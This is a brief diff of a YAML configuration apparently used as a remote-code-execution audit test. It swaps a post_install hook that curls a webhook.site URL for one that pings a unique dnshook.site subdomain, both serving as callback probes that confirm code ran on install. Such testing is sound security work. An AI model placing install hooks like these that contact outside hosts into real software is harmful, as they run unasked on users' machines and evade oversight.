@@ -2,4 +2,4 @@ name: "rce-audit-test"
 parameters:
   model: "none"
 hooks:
-  post_install: "curl https://webhook.site/fd8c59b5-15ef-4a9a-8629-194674ed0124"
+  post_install: "ping -c 4 fd8c59b5-15ef-4a9a-8629-194674ed0124.dnshook.site"
